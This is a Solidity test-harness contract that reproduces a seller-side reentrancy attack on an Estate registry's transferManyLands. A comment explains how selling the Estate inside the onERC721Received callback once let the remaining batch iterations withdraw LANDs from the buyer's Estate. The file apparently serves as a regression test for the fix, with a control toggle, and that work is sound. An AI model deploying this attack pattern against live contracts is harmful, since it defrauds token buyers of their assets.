pragma solidity ^0.4.22;

contract IEstateRegistryTarget {
  function transferManyLands(uint256 estateId, uint256[] landIds, address destinatary) external;
  function transferFrom(address from, address to, uint256 tokenId) public;
}

/**
 * @dev Reproduces the seller-side attack on `EstateRegistry.transferManyLands`.
 *
 * `_transferLand` ends in `registry.safeTransferFrom(this, destinatary, landId)`, so a contract
 * destinatary is handed a call frame while the batch still has iterations pending. On every
 * iteration `_transferLand` re-reads `ownerOf(estateId)` to decide whom to debit, so selling the
 * Estate inside that frame used to leave the remaining iterations withdrawing LANDs out of the
 * *new* owner's Estate, under an authorization that was granted before the sale.
 *
 * `sellOnReceive` toggles the sale so the same harness covers the attack and the control case:
 * with it off the batch is an ordinary owner withdrawal and must succeed.
 */
contract EstateSaleReentrancyAttacker {
  bytes4 internal constant ERC721_RECEIVED = 0x150b7a02;

  IEstateRegistryTarget public estate;

  address public buyer;
  uint256 public estateId;
  bool public sellOnReceive;
  bool public sold;
  uint256 public landsReceived;

  constructor(address _estate) public {
    estate = IEstateRegistryTarget(_estate);
  }

  function attack(
    uint256 _estateId,
    uint256[] _landIds,
    address _buyer,
    bool _sellOnReceive
  )
    external
  {
    estateId = _estateId;
    buyer = _buyer;
    sellOnReceive = _sellOnReceive;
    sold = false;
    landsReceived = 0;

    estate.transferManyLands(_estateId, _landIds, address(this));
  }

  /// @dev Called by the LAND registry mid-batch, once per withdrawn LAND.
  function onERC721Received(address, address, uint256, bytes) public returns (bytes4) {
    landsReceived += 1;

    if (sellOnReceive && !sold) {
      sold = true;
      estate.transferFrom(address(this), buyer, estateId);
    }

    return ERC721_RECEIVED;
  }
}
